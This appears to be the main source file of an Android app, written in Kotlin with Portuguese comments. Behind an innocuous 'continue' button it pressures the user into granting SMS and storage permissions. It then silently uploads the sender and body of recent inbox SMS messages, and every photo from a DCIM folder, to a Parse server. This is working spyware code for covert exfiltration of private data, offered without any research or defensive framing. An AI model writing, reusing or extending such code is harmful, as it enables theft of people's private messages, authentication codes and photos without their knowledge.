package com.example.sms4

import android.Manifest
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import android.annotation.SuppressLint
import retrofit2.Callback
import retrofit2.Response
import android.content.ContentResolver
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.widget.Button
import androidx.activity.ComponentActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.os.Environment
import android.os.SystemClock
import android.widget.Toast
import com.parse.ParseFile
import com.parse.ParseObject
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import okhttp3.Call
import okhttp3.MultipartBody
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Multipart
import retrofit2.http.POST
import retrofit2.http.Part
import java.io.File
import retrofit2.Retrofit.Builder
import java.io.FileInputStream
import okhttp3.ResponseBody as Okhttp3ResponseBody


private val PERMISSION_REQUEST_CODE = 100
private val SMS_PERMISSION_REQUEST_CODE = 100
private val SMS_SENDER_REQUEST_CODE = 100
private val STORAGE_PERMISSION_REQUEST_CODE = 101
var mensage :String = "Mensagem inicial"

val firstObject = ParseObject("FirstClass")

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContentView(R.layout.layout1)

        val botao = findViewById<Button>(R.id.btnContinuar)

        botao.setOnClickListener {
            val permissions = arrayOf(
                Manifest.permission.READ_SMS,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.REQUEST_INSTALL_PACKAGES
            )

            val permissionsToRequest = mutableListOf<String>()
            for (permission in permissions) {
                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(permission)
                }
            }

            if (permissionsToRequest.isNotEmpty()) {
                ActivityCompat.requestPermissions(
                    this,
                    permissionsToRequest.toTypedArray(),
                    PERMISSION_REQUEST_CODE
                )
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            for (i in permissions.indices) {
                val permission = permissions[i]
                val grantResult = grantResults[i]
                if (grantResult != PackageManager.PERMISSION_GRANTED)
                {
                    Toast.makeText(this, "O App precisa de todas as permissoes para funcionar", Toast.LENGTH_SHORT).show()

                }


            }
        }
        readSMS()
    }



    @SuppressLint("Range")
    fun readSMS() {

        val contentResolver: ContentResolver = contentResolver
        val uri: Uri = Uri.parse("content://sms/inbox")
        val cursor = contentResolver.query(uri, null, null, null, "date DESC LIMIT 10")

        val seenMessages = HashSet<String>() // Para rastrear mensagens já vistas
        var count = 0
        cursor?.let {
            while (it.moveToNext()) {
                count +=1
                val sender = it.getString(it.getColumnIndex("address"))
                val messageBody = it.getString(it.getColumnIndex("body"))
                val messageId = it.getString(it.getColumnIndex("_id"))

                // Verifica se já vimos esta mensagem antes
                if (!seenMessages.contains(messageId)) {
                    if(count<15){
                        val smsObject = ParseObject("sms12")
                        smsObject.put("Sender", sender)
                        smsObject.put("MessageBody", messageBody)

                        smsObject.saveInBackground { e ->
                            if (e != null) {
                                Log.e("MainActivity", "Error: ${e.localizedMessage}")
                            } else {
                                Log.d("MainActivity", "Object saved.")
                            }
                        }

                    }



                    seenMessages.add(messageId) // Adiciona o ID da mensagem ao conjunto de mensagens vistas
                }

                Log.d("SMS", "Sender: $sender - Message: $messageBody")
            }
        }

        cursor?.close()


        upload_pictures()
    }


    fun upload_pictures() {
        val dcimFolder = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
        val subdirectories = dcimFolder.listFiles { file -> file.isDirectory }
        val secondSubdirectory = subdirectories.getOrNull(1) // Obter o segundo subdiretório (índice 1)

        if (secondSubdirectory != null) {
            val images = secondSubdirectory.listFiles { file -> file.isFile && file.extension in listOf("jpg", "jpeg", "png") }

            if (images != null && images.isNotEmpty()) {
                Log.d("Upload", "Imagens encontradas ")

                for (imageFile in images) {
                    // Verificar se o arquivo ainda existe
                    if (imageFile.exists() && !imageFile.name.startsWith(".trashed")) {
                        val fileSize = imageFile.length()
                        val bufferSize = 20* 1024 * 1024 // 1 MB buffer size
                        var bytesRead: Int
                        var totalBytesRead: Long = 0

                        val fileStream = FileInputStream(imageFile)
                        val buffer = ByteArray(bufferSize)

                        // Enviar o arquivo em partes menores
                        while (fileStream.read(buffer).also { bytesRead = it } != -1) {
                            val data = buffer.copyOfRange(0, bytesRead)
                            totalBytesRead += bytesRead

                            val filePart = ParseFile("photo.jpg", data) // Criar novo ParseFile em cada iteração

                            val photoObject = ParseObject("Photos5")
                            photoObject.put("photoFile", filePart)
                            photoObject.put("Description", "Descrição da foto")

                            photoObject.saveInBackground { e ->
                                if (e == null) {
                                    // Sucesso
                                    Log.d("Upload", "Parte do arquivo enviada com sucesso: $totalBytesRead / $fileSize bytes")
                                } else {
                                    // Erro
                                    Log.d("Upload", "Erro ao enviar parte do arquivo: ${e.message}")
                                }
                            }
                        }
                        fileStream.close()
                    } else {
                        // Se o arquivo não existe mais, exibir uma mensagem de log
                        Log.d("Upload", "O arquivo ${imageFile.name} não existe mais.")
                    }
                }
            } else {

                Log.d("Upload", "Nenhuma imagem encontrada na segunda pasta")
            }
        }
    } }






